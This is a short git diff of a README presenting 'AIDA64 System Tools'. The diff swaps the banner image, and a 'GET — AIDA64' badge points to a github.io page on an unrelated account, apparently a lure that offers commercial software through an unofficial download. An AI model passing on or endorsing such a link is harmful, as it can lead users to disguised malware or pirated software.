@@ -1,6 +1,6 @@
 # AIDA64 System Tools — Hardware Diagnostics & Performance Monitoring
 
-![Banner Placeholder](https://wind10.ru/wp-content/uploads/2020/03/pp_image_80422_9gneih7dvtaida-64-dlya-windows-10.png)
+![Banner Placeholder](https://www.ferra.ru/imgs/2025/12/09/19/6937417/396b9322f88fee72200a20eaf281890d0f3258a1.png)
 
 [![GET — AIDA64](https://img.shields.io/badge/GET%20%E2%80%94%20AIDA64-0078D6?style=for-the-badge&logoColor=white)](https://stragurgan633.github.io/.github/AIDA64-System-Tools)
 
